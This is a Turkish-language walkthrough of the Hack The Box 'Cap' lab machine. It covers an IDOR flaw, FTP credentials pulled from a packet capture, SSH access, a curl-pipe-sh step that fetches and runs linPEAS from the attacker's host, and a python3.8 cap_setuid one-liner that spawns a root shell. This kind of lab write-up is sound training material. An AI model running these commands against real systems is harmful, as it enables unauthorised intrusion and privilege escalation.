# Hack The Box - Cap (Linux / Easy)

## 📅 Genel Bilgi

Yayın Tarihi: 05 Haziran 2021  
Zorluk: Kolay  
Seviye: Başlangıç  
Hazırlayan: InfoSecJack  
Platform: Hack The Box  
Hedef: Kullanıcı ve Root Bayrakları  

---

## 🚀 Proje Özeti

Bu makine, web arayüzünde erişilen ve içindeki PCAP dosyasından FTP kimlik bilgilerini sızdıran bir "Security Dashboard" içeriyor.  
Elde edilen kimlik bilgileri FTP ve SSH erişiminde kullanılıyor.  
Yetki yükseltme aşamasında Linux Capabilities kullanılarak, `/usr/bin/python3.8` üzerinde bulunan `cap_setuid` yetkisiyle root erişimi sağlanıyor.

---

## 🕵️‍♂️ Bilgi Toplama

Nmap taraması ile açık portlar ve servis versiyonları tespit edildi:


nmap -v -sS -A -T4 10.10.10.245
Açık portlar:

21/tcp - FTP (vsftpd 3.0.3)

22/tcp - SSH (OpenSSH 8.2p1 Ubuntu)

80/tcp - HTTP (Gunicorn web server)

---

🌐 Web Servisi Analizi (Port 80)
Web arayüzü "Security Dashboard" ile açılıyor.
"Security Snapshot" işlemi sonrası tarayıcı /data/[id] formatında URL'lere yönlendiriliyor.
id parametresi değiştirilerek başka kullanıcıların analiz sonuçlarına erişilebildiği tespit edildi.
Bu, IDOR (Insecure Direct Object Reference) zafiyetidir.
En fazla kayıt içeren id=0 olarak belirlendi.

---

📂 PCAP Dosyasının İncelenmesi
/data/0 dizininden indirilen pcap dosyası Wireshark ile incelendi.
FTP trafiğinden açık olarak iletilen kimlik bilgileri elde edildi:

Kullanıcı Adı: nathan
Şifre: Buck3tH4TF0RM3!

---

🔑 Erişim Sağlama
Bu kimlik bilgileri önce FTP için denendi, işe yaramadı.
SSH bağlantısı başarılı oldu.
ssh nathan@10.10.10.245


---

🏴 Kullanıcı Bayrağı (User Flag)
SSH bağlantısı sonrası kullanıcı bayrağı okundu:
cat /home/nathan/user.txt

---

🛠️ Yetki Yükseltme (Privilege Escalation)
Hedef makine dış dünyadan dosya indirmeye kapalı olduğu için linPEAS betiği saldırgan makinesinde python3 ile HTTP sunucusu açılarak hedefe aktarıldı.

Saldırgan makinesinde HTTP sunucu açılır:
python3 -m http.server 8080
Hedef makinede indirme ve çalıştırma:
curl http://10.10.16.34:8080/linpeas.sh | sh

---

⚙️ Özel Yetkili Binary Tespiti
linPEAS çıktısında /usr/bin/python3.8 dosyasının cap_setuid yetkisi olduğu görüldü.
Bu yetki programın setuid çağrısı yaparak etkin kullanıcı kimliğini değiştirmesine izin verir.

---

👑 Root Yetkisi Alımı
cap_setuid yetkisi sayesinde python3.8 kullanılarak etkin UID root yapılır ve root shell elde edilir.
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
Örnek çıktı:
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash"); '
root@cap:~#

---

🏴 Root Bayrağı (Root Flag)
Root shell açıldıktan sonra root bayrağı okunur:
cat /root/root.txt

---

📋 Özet Tablosu
Aşama              |	Durum
Nmap Taraması	     | Tamamlandı
Web Analizi (IDOR) | Tamamlandı
PCAP Analizi	     | Tamamlandı
FTP/SSH Girişi	   | Başarılı
Kullanıcı Bayrağı	 | Alındı
linPEAS Analizi	   | Tamamlandı
Yetki Yükseltme	   | Başarılı
Root Bayrağı	     | Alındı

---

🛠️ Kullanılan Araçlar
nmap
Wireshark
curl, python3 -m http.server
linpeas.sh
SSH

